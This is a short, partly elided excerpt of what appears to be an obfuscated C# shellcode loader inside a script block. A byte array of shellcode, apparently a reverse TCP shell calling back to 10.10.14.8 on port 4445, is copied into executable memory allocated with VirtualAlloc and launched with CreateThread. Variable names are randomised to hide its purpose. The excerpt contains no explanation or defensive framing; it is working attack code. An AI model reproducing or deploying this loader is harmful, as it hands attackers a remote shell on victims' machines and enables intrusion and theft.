...
0x68,0x0a,0x0a,0x0e,0x08,0x68,0x02,0x00,0x11,0x5d,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr uhTii82 = VirtualAlloc(IntPtr.Zero,(UIntPtr)kdg2f.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(kdg2f,0,uhTii82,kdg2f.Length);
        IntPtr rdHsNS = IntPtr.Zero;
        IntPtr peEqR25 = CreateThread(IntPtr.Zero,UIntPtr.Zero,uhTii82,IntPtr.Zero,0,ref rdHsNS);
    }
</script>
